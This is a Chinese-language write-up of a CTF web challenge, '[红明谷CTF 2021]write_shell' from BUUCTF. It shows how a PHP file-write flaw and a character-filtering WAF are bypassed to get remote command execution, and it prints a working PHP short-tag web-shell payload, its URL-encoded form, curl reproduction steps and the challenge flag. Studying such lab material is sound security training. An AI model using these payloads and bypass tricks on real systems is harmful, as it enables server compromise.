---

title: "[红明谷CTF 2021]write_shell"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [php, file-write, waf-bypass, short-tag]
vulnerability: 文件写入 + WAF 绕过实现 RCE
solved: true
flag: "flag{276a7314-cbb7-49d3-a019-cf521e6668b4}"
---

# [红明谷CTF 2021]write_shell

## 题目概述
题目提供一个 PHP 文件上传功能，可以将用户输入写入 sandbox 目录下的 index.php 文件。存在 WAF 过滤机制，需要绕过过滤实现 RCE。

## 信息收集
访问页面获取源码，发现：
- `upload` action 可将 `data` 参数写入 `sandbox/md5(IP)/index.php`
- WAF 过滤：`'`、空格、`_`、`php`、`;`、`~`、`^`、`+`、`eval`、`{`、`}`
- `pwd` action 可获取 sandbox 目录路径

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：任意文件写入 + WAF 绕过

**原理分析**：
1. `file_put_contents()` 将用户输入直接写入 PHP 文件
2. WAF 过滤了常见危险字符，但可通过替代方式绕过

**绕过技巧**：
| 过滤字符 | 绕过方式 |
|---------|---------|
| 单引号 `'` | 使用双引号 `"` |
| 空格 ` ` | 使用 Tab `\t` (URL编码 `%09`) |
| 分号 `;` | 使用 `?>` 结束标签 |
| `php` 关键字 | 使用短标签 `<?=` |

## 利用过程（Payload + Flag）

**Payload**：
```
<?=system("cat	/flllllll1112222222lag")?>
```
URL 编码后：
```
%3C%3F%3Dsystem%28%22cat%09/flllllll1112222222lag%22%29%3F%3E
```

**利用步骤**：
1. 获取 sandbox 目录：`?action=pwd` → `sandbox/e1891fb0b9f190933b53ba7b05c12d2a/`
2. 上传 payload：`?action=upload&data=<?=system("ls\t/")?>`
3. 执行命令：访问 `/sandbox/xxx/index.php`
4. 发现 flag 文件：`/flllllll1112222222lag`
5. 读取 flag：上传 `<?=system("cat\t/flllllll1112222222lag")?>`

**Flag**：`flag{276a7314-cbb7-49d3-a019-cf521e6668b4}`

## 复现步骤
```bash
# 1. 获取 sandbox 目录
curl -s "http://target/?action=pwd"

# 2. 上传 webshell（用 tab 替代空格）
curl -s "http://target/?action=upload&data=%3C%3F%3Dsystem%28%22ls%09/%22%29%3F%3E"

# 3. 访问执行
curl -s "http://target/sandbox/[md5]/index.php"

# 4. 读取 flag
curl -s "http://target/?action=upload&data=%3C%3F%3Dsystem%28%22cat%09/flllllll1112222222lag%22%29%3F%3E"
curl -s "http://target/sandbox/[md5]/index.php"
```

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|-------|
| 文件写入 | upload action | `<?=system("cmd")?>` | PHP短标签、空白字符替代 |
| WAF绕过 | data参数 | 双引号+Tab+?> | 正则过滤绕过技巧 |

## 知识总结（解题技巧、同类题型套路）

1. **PHP 短标签**：`<?=` 是 `<?php echo` 的简写，不包含 `php` 字符串
2. **空白字符替代**：Tab (`\t`)、换行 (`\n`)、`$IFS` 都可替代空格
3. **分号替代**：PHP 最后一行可不加分号，或用 `?>` 结束
4. **引号替代**：双引号可替代单引号，注意双引号会解析变量
